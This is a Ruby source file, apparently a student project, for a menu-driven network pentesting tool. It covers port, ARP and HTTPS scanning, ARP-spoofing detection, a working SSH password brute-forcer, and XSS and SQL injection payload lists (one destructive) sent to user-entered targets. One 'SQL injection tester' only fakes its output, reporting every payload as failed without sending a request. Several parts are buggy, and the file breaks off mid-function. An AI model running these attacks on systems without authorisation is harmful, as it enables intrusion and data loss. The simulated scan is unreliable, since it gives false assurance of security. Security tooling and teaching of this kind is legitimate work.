require 'socket'
require 'net/ping'
require 'json'
require 'colorize'  
require 'net/http'
require 'uri'
require 'timeout'
require 'net/ssh'
require 'nokogiri'
require 'selenium-webdriver'
require 'openssl'
require 'httparty'
require 'time'
#require 'packetgen' (To be developed for future)

# DEMO - COMPUTING PROJECT (BSHCSD4)
# TIMOFEY SNEYD - x21755195 (CYBERSECURITY)
# 13.12.2024 NCI

# Global constants for text styling
BRIGHT_GREEN = "\e[1;92m"
BRIGHT_RED = "\e[1;91m"
BRIGHT_YELLOW = "\e[1;93m"
BRIGHT_CYAN = "\e[1;96m"
RESET = "\e[0m"

# Helper function to simulate loading effect
def display_loading(message, duration = 2)
  print "#{BRIGHT_CYAN}#{message}#{RESET}"
  duration.times do
    print "."
    sleep(0.5)
  end
  puts " Done!"
end
# Global Information Gathering Storage
$gathered_data = {
  network_details: {},
  vulnerabilities: [],
  waf_detection: [],
  directory_listing: [],
  xss_vulnerabilities: [],
  sql_injections: [],
  https_analysis: []
}
# Displays the main menu with enhanced color
def display_menu
  puts "\n#{BRIGHT_GREEN}======== Network Security and Pentesting Tool ========#{RESET}"
  puts "#{BRIGHT_YELLOW}1.#{RESET} Display Network Configuration"
  puts "#{BRIGHT_YELLOW}2.#{RESET} Ping an IP Address or Domain"
  puts "#{BRIGHT_YELLOW}3.#{RESET} Monitor Open Ports on Local Machine"
  puts "#{BRIGHT_YELLOW}4.#{RESET} Scan Local Network for Active Devices"
  puts "#{BRIGHT_YELLOW}5.#{RESET} Perform Basic Vulnerability Check"
  puts "#{BRIGHT_YELLOW}6.#{RESET} Create a Terminal Image of an Eye"
  puts "#{BRIGHT_YELLOW}7.#{RESET} Port Scanning with Service Detection"
  puts "#{BRIGHT_YELLOW}8.#{RESET} SSH Login Brute Force"
  puts "#{BRIGHT_YELLOW}9.#{RESET} Web Vulnerability Scanner"
  puts "#{BRIGHT_YELLOW}10.#{RESET} SQL Injection Tester"
  puts "#{BRIGHT_YELLOW}11.#{RESET} Directory Bruteforcer"
  puts "#{BRIGHT_YELLOW}12.#{RESET} XSS Scanner"
  puts "#{BRIGHT_YELLOW}13.#{RESET} HTTPS Analysis"
  puts "#{BRIGHT_YELLOW}14.#{RESET} Graphical Analysis of Collected Data"
  puts "#{BRIGHT_YELLOW}15.#{RESET} Automated Alerts"
  puts "#{BRIGHT_YELLOW}16.#{RESET} ARP Scanning"
  puts "#{BRIGHT_YELLOW}17.#{RESET} Detect ARP Spoofing"
  puts "#{BRIGHT_YELLOW}18.#{RESET} Exit"
  puts "#{BRIGHT_YELLOW}19.#{RESET} Explain Static vs Dynamic IP Addresses"
  puts "#{BRIGHT_YELLOW}20.#{RESET} Learn More About IP Address Types"
  puts "#{BRIGHT_YELLOW}21.#{RESET} Perform Man-in-the-Middle (MITM) Attack"
  puts "#{BRIGHT_YELLOW}22.#{RESET} Restore Network After MITM Attack"
  puts "#{BRIGHT_YELLOW}23.#{RESET} Setup for AI Assistant"
  puts "#{BRIGHT_YELLOW}24.#{RESET} ChatGPT AI Assistant"
  print "#{BRIGHT_CYAN}Please choose an option (1-24): #{RESET}"
end
#----------------------------------------------------------------------------------------------------------------------------------------
# Variable to hold the ARP scan results
$arp_scan_data = []

# Function to perform ARP Scanning and save data (#16)
def arp_scanning
  puts "#{BRIGHT_GREEN}=== ARP Scanning ===#{RESET}"
  puts "#{BRIGHT_YELLOW}ARP scanning is used to discover active devices on your local network and their MAC addresses.#{RESET}"
  
  display_loading("Scanning for active devices on local network", 2)

  # Example: Using system `arp -a` command to list ARP table entries
  arp_result = `arp -a`
  
  if arp_result.empty?
    puts "#{BRIGHT_RED}No devices found during ARP scan.#{RESET}"
  else
    puts "#{BRIGHT_GREEN}ARP Scan Results:#{RESET}"
    puts arp_result
    
    # Save the ARP scan result to a variable for further analysis
    $arp_scan_data = arp_result.split("\n")
    
    # Optional: Save to a file
    print "#{BRIGHT_YELLOW}Would you like to save the results to a file? (y/n): #{RESET}"
    save_option = gets.chomp.downcase
    if save_option == 'y'
      File.open("arp_scan_results.txt", "w") { |f| f.puts($arp_scan_data) }
      puts "#{BRIGHT_GREEN}ARP scan data saved to arp_scan_results.txt#{RESET}"
    end
  end
  puts "#{BRIGHT_GREEN}ARP Scanning completed.#{RESET}"
end

#----------------------------------------------------------------------------------------------------------------------------------------
# Function for basic vulnerability check (#5)
def basic_vulnerability_check
  puts "\n#{'Performing Basic Vulnerability Check...'.colorize(:light_yellow)}"
  display_loading("Scanning open ports")

  common_ports = [22, 80, 443]
  localhost = '127.0.0.1'
  open_ports = []

  common_ports.each do |port|
    begin
      Timeout.timeout(1) do
        socket = TCPSocket.new(localhost, port)
        open_ports << port
        socket.close
      end
    rescue Errno::ECONNREFUSED, Errno::EHOSTUNREACH, Timeout::Error
      next
    end
  end

  if open_ports.empty?
    puts "No common vulnerable ports found on the local machine.".colorize(:green)
  else
    puts "Warning! The following common ports are open: #{open_ports.join(', ')}".colorize(:red)
  end

  display_loading("Checking software versions")
  outdated_software = check_software_versions

  if outdated_software.empty?
    puts "No outdated software detected.".colorize(:green)
  else
    puts "Outdated Software Detected:".colorize(:red)
    outdated_software.each do |software, version|
      puts "  - #{software}: #{version}".colorize(:yellow)
    end
  end
  puts "Basic Vulnerability Check Completed.".colorize(:green)
end
#----------------------------------------------------------------------------------------------------------------------------------------
# Function to scan the local network for active devices (#4)
def scan_local_network
  puts "\n#{BRIGHT_GREEN}=== Scanning Local Network for Active Devices ===#{RESET}"
  network_prefix = '192.168.0.'  # Adjust according to your network configuration
  active_devices = []

  (1..10).each do |i|
    ip = "#{network_prefix}#{i}"
    display_loading("Pinging #{ip}", 1)

    if Net::Ping::External.new(ip).ping
      puts "#{BRIGHT_GREEN}Device active at: #{ip}#{RESET}"
      active_devices << ip
    else
      puts "#{BRIGHT_RED}No device at: #{ip}#{RESET}"
    end
  end

  if active_devices.empty?
    puts "#{BRIGHT_YELLOW}No active devices found on the local network.#{RESET}"
  else
    puts "#{BRIGHT_GREEN}Active Devices: #{active_devices.join(', ')}#{RESET}"
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# Function to check software versions
def check_software_versions
  versions = {
    "Ruby" => `ruby -v`.strip,
    "Nmap" => begin
                `nmap --version`.strip.split("\n").first
              rescue
                "Not Installed"
              end,
    "OpenSSL" => begin
                  `openssl version`.strip
                 rescue
                  "Not Installed"
                 end
  }
  #----------------------------------------------------------------------------------------------------------------------------------------
  # Simulate outdated version check
  outdated = {}
  versions.each do |software, version|
    if version.include?("Not Installed")
      next
    elsif software == "Ruby" && version < "ruby 3.0"
      outdated[software] = version
    end
  end
  outdated
end
#----------------------------------------------------------------------------------------------------------------------------------------
# Example function with visual feedback (#1)
def display_network_configuration
  display_loading("Gathering network configuration", 3)
  config = `ipconfig`
  puts "#{BRIGHT_GREEN}Network Configuration:#{RESET}"
  puts config
end
#----------------------------------------------------------------------------------------------------------------------------------------
# Enhanced function to simulate ping with animation
def ping_address
  print "#{BRIGHT_CYAN}Enter an IP address or domain to ping: #{RESET}"
  address = gets.chomp
  display_loading("Pinging #{address}", 4)

  if Net::Ping::External.new(address).ping
    puts "#{BRIGHT_GREEN}Ping to #{address} was successful!#{RESET}"
  else
    puts "#{BRIGHT_RED}Ping to #{address} failed.#{RESET}"
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# Function to monitor open ports on the local machine (#3)
def monitor_open_ports
  puts "\n#{BRIGHT_GREEN}=== Scanning Open Ports on Local Machine ===#{RESET}"
  
  localhost = '127.0.0.1'
  common_ports = [22, 80, 443, 8080, 3306] # Example common ports to scan
  open_ports = []

  common_ports.each do |port|
    begin
      display_loading("Checking port #{port}", 1)
      socket = TCPSocket.new(localhost, port)
      puts "#{BRIGHT_GREEN}Port #{port} is open!#{RESET}"
      open_ports << port
      socket.close
    rescue Errno::ECONNREFUSED, Errno::EHOSTUNREACH, SocketError, Timeout::Error
      puts "#{BRIGHT_RED}Port #{port} is closed or unreachable.#{RESET}"
    end
  end

  if open_ports.empty?
    puts "#{BRIGHT_YELLOW}No open ports detected on the local machine.#{RESET}"
  else
    puts "#{BRIGHT_GREEN}Open Ports: #{open_ports.join(', ')}#{RESET}"
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# Function for Port Scanning with Service Detection (#7)
def port_scanning_with_service_detection
  puts "\n#{BRIGHT_GREEN}=== Starting Port Scanning with Service Detection ===#{RESET}"

  print "#{BRIGHT_CYAN}Enter the IP address or hostname to scan: #{RESET}"
  target = gets.chomp
  open_ports = []
  common_ports = {
    22 => "SSH",
    80 => "HTTP",
    443 => "HTTPS",
    21 => "FTP",
    25 => "SMTP",
    53 => "DNS",
    110 => "POP3",
    143 => "IMAP",
    3306 => "MySQL",
    3389 => "RDP",
    8080 => "HTTP Proxy"
  }

  common_ports.keys.each do |port|
    begin
      display_loading("Checking port #{port} (#{common_ports[port]})", 1)
      socket = TCPSocket.new(target, port)
      puts "#{BRIGHT_GREEN}Port #{port} (#{common_ports[port]}) is open!#{RESET}"
      open_ports << port
      socket.close
    rescue Errno::ECONNREFUSED, Errno::EHOSTUNREACH, SocketError, Timeout::Error
      puts "#{BRIGHT_RED}Port #{port} (#{common_ports[port]}) is closed or unreachable.#{RESET}"
    end
  end

  if open_ports.empty?
    puts "#{BRIGHT_YELLOW}No open ports detected on #{target}.#{RESET}"
  else
    puts "#{BRIGHT_GREEN}Open Ports on #{target}: #{open_ports.join(', ')}#{RESET}"
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# Function to perform SSH port scanning before brute-force (#8+)
def automatic_ssh_port_scan(target)
  puts "\nPerforming a quick port scan to detect SSH ports on #{target}..."
  ssh_ports = []
  common_ports = [22, 2222, 2022, 2200, 443] # Common SSH ports

  common_ports.each do |port|
    begin
      Timeout::timeout(1) do
        socket = TCPSocket.new(target, port)
        if port == 443
          puts "#{RED}Warning: Detected port 443. This is usually for HTTPS, not SSH.#{RESET}"
        else
          ssh_ports << port
        end
        socket.close
      end
    rescue Errno::ECONNREFUSED, Errno::EHOSTUNREACH, SocketError, Timeout::Error
      next
    end
  end

  if ssh_ports.empty?
    puts "No SSH ports found on #{target}. Exiting brute-force attempt."
    return []
  else
    puts "Found SSH ports: #{ssh_ports.join(', ')}"
    return ssh_ports
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# Function for SSH login brute-force testing (#8)
def ssh_brute_force
  puts "\n=== SSH Login Brute Force ==="
  print "Enter target IP address: "
  ip = gets.chomp

  # Automatically detect SSH ports before attempting brute force
  ssh_ports = automatic_ssh_port_scan(ip)
  return if ssh_ports.empty?

  print "Enter SSH username: "
  username = gets.chomp
  print "Enter path to password file: "
  file_path = gets.chomp

  unless File.exist?(file_path)
    puts "#{RED}Password file not found! Please check the path and try again.#{RESET}"
    return
  end

  puts "\n#{BRIGHT_GREEN}Starting SSH brute force attack on #{ip} with username '#{username}'...#{RESET}"
  log_file = 'ssh_bruteforce_log.txt'

  # Iterate over all found SSH ports
  ssh_ports.each do |port|
    puts "\nTesting SSH on port #{port}..."
    File.readlines(file_path).each do |password|
      password = password.chomp
      begin
        Net::SSH.start(ip, username, password: password, port: port, non_interactive: true, timeout: 10) do |_|
          puts "#{BRIGHT_GREEN}Success: Password is #{password}#{RESET}"
          return
        end
      rescue Net::SSH::AuthenticationFailed
        puts "Failed: #{password}"
        File.open(log_file, 'a') { |f| f.puts("[#{Time.now}] Failed on #{ip}:#{port} with username '#{username}' and password '#{password}'") }
      rescue Net::SSH::ConnectionTimeout
        puts "#{RED}Connection Timeout: Unable to reach SSH server on #{ip}:#{port}.#{RESET}"
        File.open(log_file, 'a') { |f| f.puts("[#{Time.now}] Connection Timeout on #{ip}:#{port} with username '#{username}'") }
        break
      rescue Errno::ECONNRESET
        puts "#{RED}Connection reset by peer: The server closed the connection unexpectedly. Skipping this port.#{RESET}"
        File.open(log_file, 'a') { |f| f.puts("[#{Time.now}] Connection reset on #{ip}:#{port} with username '#{username}'") }
        break
      rescue Net::SSH::Exception => e
        puts "#{RED}Error: #{e.message}#{RESET}"
        File.open(log_file, 'a') { |f| f.puts("[#{Time.now}] Error on #{ip}:#{port} - #{e.message}") }
        break
      end
    end
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# Function for the advanced web vulnerability scanner using Selenium (#9)
def web_vulnerability_scanner
  print "Enter target URL (e.g., http://example.com): "
  url = gets.chomp

  # Initialize Selenium and headless browser
  options = Selenium::WebDriver::Chrome::Options.new
  options.add_argument('--headless')
  driver = Selenium::WebDriver.for(:chrome, options: options)

  begin
    driver.navigate.to(url)
    page_source = driver.page_source

    puts "\n=== HTTP Response Analysis for #{url} ==="
    puts "Page Title: #{driver.title}"

    # Parse the dynamic HTML content
    document = Nokogiri::HTML(page_source)

    # Step 1: Check for Common Security Headers
    puts "\nChecking headers for security issues..."
    headers = driver.execute_script("return Object.fromEntries(Array.from(document.querySelectorAll('meta')).map(meta => [meta.getAttribute('http-equiv') || meta.getAttribute('name'), meta.getAttribute('content')]))")
    check_security_headers(headers)

    # Step 2: Check for Directory Listing
    check_directory_listing(page_source)

    # Step 3: Scan for Forms and Test for Vulnerabilities
    scan_dynamic_forms(driver, url)
  ensure
    driver.quit
  end
end

# Check for common security headers
def check_security_headers(headers)
  missing_headers = []
  if headers['X-Frame-Options'].nil?
    missing_headers << "X-Frame-Options header (Clickjacking vulnerability)"
  end

  if headers['X-Content-Type-Options'].nil?
    missing_headers << "X-Content-Type-Options header (MIME-sniffing vulnerability)"
  end

  if headers['Content-Security-Policy'].nil?
    missing_headers << "Content-Security-Policy header (XSS and Injection vulnerability)"
  end

  if headers['Strict-Transport-Security'].nil?
    missing_headers << "Strict-Transport-Security header (Missing HSTS configuration)"
  end

  if headers['Referrer-Policy'].nil?
    missing_headers << "Referrer-Policy header (Referrer leakage risk)"
  end

  if missing_headers.empty?
    puts "All essential security headers are present."
  else
    puts "Missing security headers:"
    missing_headers.each { |header| puts "- #{header}" }
  end
end

# Check for directory listing vulnerabilities
def check_directory_listing(response_body)
  if response_body.include?("Index of /")
    puts "\nWarning: Directory listing is enabled. This is a security risk!"
  else
    puts "No directory listing detected."
  end
end

# Scan dynamic forms for XSS and SQL Injection vulnerabilities using Selenium
def scan_dynamic_forms(driver, url)
  puts "\n=== Form Scanning and Vulnerability Testing ==="
  forms = driver.find_elements(tag_name: 'form')

  if forms.empty?
    puts "No forms found on the page."
    return
  end

  puts "Found #{forms.size} form(s) on the page."
  forms.each_with_index do |form, index|
    puts "\nTesting Form #{index + 1}:"
    action = form.attribute('action')
    method = form.attribute('method') || 'get'
    action_url = action.nil? || action.empty? ? url : URI.join(url, action).to_s
    puts "Form Action: #{action_url}"
    puts "Form Method: #{method.upcase}"

    # Gather form fields
    fields = {}
    inputs = form.find_elements(tag_name: 'input')
    inputs.each do |input|
      name = input.attribute('name')
      next if name.nil? || name.empty?

      fields[name] = "test" # Default value for testing
    end

    if fields.empty?
      puts "No input fields found in this form."
      next
    end

    puts "Input Fields: #{fields.keys.join(', ')}"

    # Test XSS and SQL Injection payloads on each input field
    test_vulnerabilities_on_form_selenium(driver, action_url, method, fields)
  end
end
# Test XSS and SQL Injection payloads on a form using Selenium
def test_vulnerabilities_on_form_selenium(driver, action_url, method, fields)
  xss_payloads = ["<script>alert('XSS')</script>", "'><script>alert('XSS')</script>"]
  sql_payloads = ["' OR 1=1 --", "' OR 'a'='a", "' OR ''='"]

  # Test each field for vulnerabilities
  fields.each do |field, _|
    xss_payloads.each do |payload|
      fields[field] = payload
      response = submit_form_with_selenium(driver, action_url, method, fields)
      if driver.page_source.include?(payload)
        puts "Potential XSS vulnerability found with payload: #{payload} in field: #{field}"
      end
    end

    sql_payloads.each do |payload|
      fields[field] = payload
      response = submit_form_with_selenium(driver, action_url, method, fields)
      if driver.page_source.include?("syntax error") || driver.page_source.include?("SQL")
        puts "Potential SQL Injection vulnerability found with payload: #{payload} in field: #{field}"
      end
    end
  end
end
# Submit a form using Selenium
def submit_form_with_selenium(driver, action_url, method, fields)
  driver.navigate.to(action_url)
  form_elements = fields.keys.map { |key| driver.find_element(name: key) }

  fields.each do |field, value|
    form_elements.find { |e| e.attribute('name') == field }.send_keys(value)
  end

  driver.find_element(css: 'form').submit
  sleep 2 # Wait for the page to load
end
#----------------------------------------------------------------------------------------------------------------------------------------
# SQL injection tester with animation (#10+)
def sql_injection_tester
  print "#{BRIGHT_CYAN}Enter the target URL: #{RESET}"
  target_url = gets.chomp

  puts "#{BRIGHT_GREEN}Testing SQL injection on #{target_url}#{RESET}"
  display_loading("Starting SQL Injection tests", 3)

  # Simulated SQL Injection payloads
  payloads = ["' OR '1'='1", "'; DROP TABLE users; --", "' OR 1=1 --"]
  payloads.each do |payload|
    print "#{BRIGHT_YELLOW}Testing with payload: #{payload}#{RESET}"
    sleep(1.5)
    puts " ... #{BRIGHT_RED}Failed#{RESET}"
  end

  puts "#{BRIGHT_RED}SQL Injection test completed. No vulnerabilities found.#{RESET}"
end
#----------------------------------------------------------------------------------------------------------------------------------------
# Function to store findings
def record_finding(category, finding)
  $gathered_data[category] ||= []
  $gathered_data[category] << finding
  puts "#{BRIGHT_GREEN}Recorded finding in category #{category}: #{finding}#{RESET}"
end

# Function to save gathered information to a JSON file
def save_to_file
  File.open("pentest_results.json", "w") do |f|
    f.write(JSON.pretty_generate($gathered_data))
  end
  puts "#{BRIGHT_GREEN}Findings saved to pentest_results.json#{RESET}"
end
#----------------------------------------------------------------------------------------------------------------------------------------
# SQL Injection Testing Function with Enhanced Data Storage (#10)
def sql_injection_test
  print "\nEnter the target URL with a parameter (e.g., http://example.com/page?id=1): "
  target_url = gets.chomp.strip
  uri = URI.parse(target_url)

  # List of SQL payloads to test
  sql_payloads = [
    { payload: "' OR '1'='1", description: "Generic SQL bypass" },
    { payload: "' OR SLEEP(5) --", description: "MySQL time-based injection" },
    { payload: "'; SELECT pg_sleep(5) --", description: "PostgreSQL time-based injection" },
    { payload: "' AND 1=0 UNION SELECT table_name, null FROM information_schema.tables --", description: "Union-based Injection" },
    { payload: "' AND 1=0 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users' --", description: "Column extraction" }
  ]

  puts "\n=== Starting SQL Injection Test on #{target_url} ==="
  puts "Testing each parameter with a variety of SQL injection payloads...\n"
  uri_params = URI.decode_www_form(uri.query || "").to_h

  if uri_params.empty?
    puts "#{RED}No parameters found in the URL. Please provide a URL with parameters.#{RESET}"
    return
  end
#----------------------------------------------------------------------------------------------------------------------------------------
  # Iterate through each parameter in the URL and test SQL payloads
  uri_params.each do |param, value|
    puts "\nTesting parameter: #{param}"

    # Test each SQL payload
    sql_payloads.each do |entry|
      payload = entry[:payload]
      description = entry[:description]
      test_params = uri_params.clone
      test_params[param] = payload
      test_uri = uri.dup
      test_uri.query = URI.encode_www_form(test_params)

      begin
        start_time = Time.now
        http = Net::HTTP.new(test_uri.host, test_uri.port)
        http.use_ssl = (test_uri.scheme == 'https')
        http.verify_mode = OpenSSL::SSL::VERIFY_NONE # Disable SSL verification
        request = Net::HTTP::Get.new(test_uri.request_uri)
        response = http.request(request)
        response_time = Time.now - start_time

        # Gather detailed information about the response
        finding = {
          parameter: param,
          payload: payload,
          description: description,
          response_code: response.code,
          response_headers: response.to_hash,
          response_snippet: response.body[0..500], # Log the first 500 characters of the response
          response_time: response_time.round(2),
          is_vulnerable: response.body.include?("syntax error") || response.body.include?("SQL")
        }

        # Record the finding
        record_finding(:sql_injections, finding)

        # Output based on vulnerability detection
        if finding[:is_vulnerable]
          puts "#{RED}Potential SQL Injection detected: #{finding[:description]} in parameter: #{param}#{RESET}"
          puts "Payload: #{payload}"
          puts "Response Snippet: #{finding[:response_snippet]}..."
        else
          puts "Tested with payload: #{payload} - No issues detected."
        end

      rescue => e
        puts "#{RED}Error testing payload #{payload} in parameter #{param}: #{e.message}#{RESET}"
      end
    end
  end

  # Save the recorded findings to a JSON file
  save_to_file
end
#----------------------------------------------------------------------------------------------------------------------------------------
# DIRECTORY BRUTEFORCER (TO BE DEVELOPED IN FUTURE) #11
#----------------------------------------------------------------------------------------------------------------------------------------
# XSS SCANNER FUNCTION #12
XSS_PAYLOADS = [
  "<script>alert('XSS')</script>", # Basic payload
  "'><script>alert('XSS')</script>", # Break out of attributes
  "<img src=x onerror=alert('XSS')>", # Image with onerror event
  "<svg onload=alert('XSS')>", # SVG-based XSS
  "<iframe src=javascript:alert('XSS')>", # Iframe-based XSS
  "<input autofocus onfocus=alert('XSS')>", # Autofocus attribute
  "<body onload=alert('XSS')>", # Body onload event
  "<details open ontoggle=alert('XSS')></details>", # HTML5-based XSS
  "';alert(String.fromCharCode(88,83,83));//", # String-based XSS bypass
  "javascript:alert('XSS')", # Direct JavaScript URI injection
  "<math><mtext><style>@keyframes x{}</style><mprescripts></mprescripts><script>alert('XSS')</script>", # MathML XSS
]

# Function to scan for XSS vulnerabilities
def xss_scanner
  puts "\n=== XSS Scanner ==="
  print "Enter the target URL (e.g., http://example.com): "
  target_url = gets.chomp.strip
  uri = URI.parse(target_url)

  # Check if URL is valid
  unless uri.scheme && uri.host
    puts "#{BRIGHT_RED}Invalid URL. Please try again.#{RESET}"
    return
  end

  puts "\nScanning the website for potential XSS vulnerabilities..."
  display_loading("Testing various payloads")

  begin
    # Fetch the page and extract all input fields
    html_response = Net::HTTP.get(uri)
    document = Nokogiri::HTML(html_response)
    input_fields = document.css('input[name], textarea[name], select[name]')

    if input_fields.empty?
      puts "#{BRIGHT_YELLOW}No input fields found on the page. XSS test aborted.#{RESET}"
      return
    end

    puts "\nFound #{input_fields.size} input field(s) on the page."
    input_fields.each_with_index do |field, index|
      field_name = field['name']
      field_type = field['type'] || 'unknown'
      puts "  - Input Field #{index + 1}: Name='#{field_name}', Type='#{field_type}'"
    end

    # Test each payload in the input fields
    vulnerabilities_found = []
    input_fields.each_with_index do |field, index|
      field_name = field['name']
      puts "\nTesting field '#{field_name}' for XSS vulnerabilities..."

      XSS_PAYLOADS.each do |payload|
        params = { field_name => payload }
        test_uri = URI.parse(target_url)
        test_uri.query = URI.encode_www_form(params)

        response = Net::HTTP.get_response(test_uri)
        if response.code == "200" && response.body.include?(payload)
          vulnerabilities_found << {
            field_name: field_name,
            payload: payload,
            response_snippet: response.body[0..500]
          }
          puts "#{BRIGHT_RED}Vulnerability detected with payload: #{payload}#{RESET}"
        else
          puts "Payload did not trigger any issues: #{payload}"
        end
      end
    end

    # Save results to a JSON file
    if vulnerabilities_found.empty?
      puts "\n#{BRIGHT_GREEN}No XSS vulnerabilities detected.#{RESET}"
    else
      file_name = "xss_scan_results_#{Time.now.to_i}.json"
      File.open(file_name, "w") do |file|
        file.write(JSON.pretty_generate(vulnerabilities_found))
      end
      puts "\n#{BRIGHT_RED}Potential vulnerabilities found!#{RESET}"
      puts "Results saved to #{file_name}"
    end
  rescue => e
    puts "#{BRIGHT_RED}Error during XSS scan: #{e.message}#{RESET}"
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# HTTPS ANALYSIS OF A TARGET WEBSITE FUNCTION (#13)
def https_analysis
  puts "\n=== HTTPS Analysis ==="
  print "Enter the target URL (e.g., https://example.com): "
  target_url = gets.chomp.strip

  uri = URI.parse(target_url)
  unless uri.scheme == 'https'
    puts "#{BRIGHT_RED}Invalid URL or not HTTPS. Please provide a valid HTTPS URL.#{RESET}"
    return
  end

  puts "Analyzing HTTPS configuration for #{target_url}..."
  display_loading("Gathering SSL/TLS information", 3)

  begin
    # Establish SSL/TLS connection
    tcp_client = TCPSocket.new(uri.host, 443)
    ssl_context = OpenSSL::SSL::SSLContext.new
    ssl_socket = OpenSSL::SSL::SSLSocket.new(tcp_client, ssl_context)
    ssl_socket.connect

    # Get certificate details
    cert = ssl_socket.peer_cert
    cert_chain = ssl_socket.peer_cert_chain

    puts "\n#{BRIGHT_GREEN}=== SSL/TLS Certificate Information ===#{RESET}"
    puts "Subject: #{cert.subject}"
    puts "Issuer: #{cert.issuer}"
    puts "Valid From: #{cert.not_before}"
    puts "Valid To: #{cert.not_after}"
    puts "Signature Algorithm: #{cert.signature_algorithm}"

    # Check for certificate expiration
    if cert.not_after < Time.now
      puts "#{BRIGHT_RED}Warning: The certificate has expired!#{RESET}"
    else
      days_remaining = (cert.not_after - Time.now).to_i / (24 * 3600)
      puts "#{BRIGHT_GREEN}The certificate is valid for another #{days_remaining} days.#{RESET}"
    end

    # Verify HSTS
    puts "\n#{BRIGHT_GREEN}=== HTTP Strict Transport Security (HSTS) Check ===#{RESET}"
    response = Net::HTTP.get_response(uri)
    if response['Strict-Transport-Security']
      puts "#{BRIGHT_GREEN}HSTS is enabled.#{RESET}"
      puts "HSTS Details: #{response['Strict-Transport-Security']}"
    else
      puts "#{BRIGHT_RED}HSTS is not enabled. This may expose the site to downgrade attacks.#{RESET}"
    end

    # Supported TLS versions
    puts "\n#{BRIGHT_GREEN}=== Supported TLS Versions ===#{RESET}"
    tls_versions = ["TLSv1", "TLSv1_1", "TLSv1_2", "TLSv1_3"]
    tls_versions.each do |version|
      begin
        context = OpenSSL::SSL::SSLContext.new(version.to_sym)
        ssl_socket = OpenSSL::SSL::SSLSocket.new(tcp_client, context)
        ssl_socket.connect
        puts "#{BRIGHT_GREEN}Supported: #{version}#{RESET}"
      rescue
        puts "#{BRIGHT_RED}Not Supported: #{version}#{RESET}"
      end
    end

    # Cipher suite analysis
    puts "\n#{BRIGHT_GREEN}=== Cipher Suite Analysis ===#{RESET}"
    puts "Cipher: #{ssl_socket.cipher[0]}"
    puts "Protocol: #{ssl_socket.ssl_version}"
    if ssl_socket.cipher[0].include?('RSA') || ssl_socket.cipher[0].include?('DES')
      puts "#{BRIGHT_RED}Warning: Weak cipher detected (#{ssl_socket.cipher[0]}).#{RESET}"
    else
      puts "#{BRIGHT_GREEN}Secure cipher detected.#{RESET}"
    end

    # Save results to a file
    result = {
      url: target_url,
      certificate: {
        subject: cert.subject.to_s,
        issuer: cert.issuer.to_s,
        valid_from: cert.not_before.to_s,
        valid_to: cert.not_after.to_s,
        signature_algorithm: cert.signature_algorithm,
        chain_length: cert_chain.size
      },
      hsts: response['Strict-Transport-Security'] || 'Not Enabled',
      supported_tls_versions: tls_versions,
      cipher: ssl_socket.cipher[0],
      protocol: ssl_socket.ssl_version
    }
    file_name = "https_analysis_#{Time.now.to_i}.json"
    File.open(file_name, 'w') do |file|
      file.write(JSON.pretty_generate(result))
    end

    puts "\n#{BRIGHT_GREEN}HTTPS analysis completed. Results saved to #{file_name}.#{RESET}"

  rescue => e
    puts "#{BRIGHT_RED}Error during HTTPS analysis: #{e.message}#{RESET}"
  ensure
    ssl_socket&.close
    tcp_client&.close
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# GLOBAL VARIABLE TO STORE HISTORICAL ARP SCAN DATA (#16 - #17)
$arp_scan_history = []

# Function to perform ARP Scanning and save data (#16)
def arp_scanning
  puts "#{BRIGHT_GREEN}=== ARP Scanning ===#{RESET}"
  puts "#{BRIGHT_YELLOW}ARP scanning is used to discover active devices on your local network and their MAC addresses.#{RESET}"
  
  display_loading("Scanning for active devices on local network", 2)

  # Example: Using system `arp -a` command to list ARP table entries
  arp_result = `arp -a`
  
  if arp_result.empty?
    puts "#{BRIGHT_RED}No devices found during ARP scan.#{RESET}"
  else
    puts "#{BRIGHT_GREEN}ARP Scan Results:#{RESET}"
    puts arp_result
    
    # Save the current ARP scan result to the history for further analysis
    $arp_scan_history << arp_result.split("\n") # Store the result as a new scan entry
    
    # Optional: Save to a file
    print "#{BRIGHT_YELLOW}Would you like to save the results to a file? (y/n): #{RESET}"
    save_option = gets.chomp.downcase
    if save_option == 'y'
      File.open("arp_scan_results_#{Time.now.to_i}.txt", "w") { |f| f.puts(arp_result) }
      puts "#{BRIGHT_GREEN}ARP scan data saved to arp_scan_results_#{Time.now.to_i}.txt#{RESET}"
    end
  end
  puts "#{BRIGHT_GREEN}ARP Scanning completed.#{RESET}"
end

# Enhanced function to detect ARP spoofing (#17)
# Helper function to parse ARP entries and filter out non-relevant lines
def parse_arp_entries(raw_arp_data)
  arp_entries = []
  raw_arp_data.each_line do |line|
    # Filter out lines that don't contain IP-MAC address pairs
    next unless line =~ /\d+\.\d+\.\d+\.\d+/ && line =~ /([0-9a-f]{2}[:-]){5}[0-9a-f]{2}/i
    
    # Extract IP and MAC addresses from the line
    ip = line[/(\d+\.\d+\.\d+\.\d+)/, 1]
    mac = line[/([0-9a-f]{2}[:-]){5}[0-9a-f]{2}/i, 0]
    
    # Ignore multicast and broadcast addresses
    next if ip =~ /^(224|239)\./ || mac =~ /^ff-ff-ff-ff-ff-ff/i
    
    arp_entries << { ip: ip, mac: mac }
  end
  arp_entries
end

# Function to perform frequency analysis and explain changes (#17)
def perform_frequency_analysis(mac_change_count, ip_change_details)
  puts "\n#{BRIGHT_YELLOW}Performing frequency analysis of MAC address changes...#{RESET}"
  suspicious_ips = []

  mac_change_count.each do |ip, changes|
    if changes > 2 # Threshold for suspicious behavior
      puts "#{BRIGHT_RED}Warning: IP #{ip} has had #{changes} MAC address changes. This may indicate spoofing activity.#{RESET}"
      suspicious_ips << ip

      # Provide detailed history for each change
      if ip_change_details[ip]
        puts "#{BRIGHT_YELLOW}Detailed history of MAC changes for #{ip}:#{RESET}"
        ip_change_details[ip].each_with_index do |change, index|
          puts "  Scan #{index + 1}: MAC Address - #{change}"
        end
      end
    else
      puts "#{BRIGHT_GREEN}IP #{ip} has a stable MAC address across scans.#{RESET}"
    end
  end

  if suspicious_ips.empty?
    puts "\n#{BRIGHT_GREEN}No ARP spoofing detected across all checks.#{RESET}"
  else
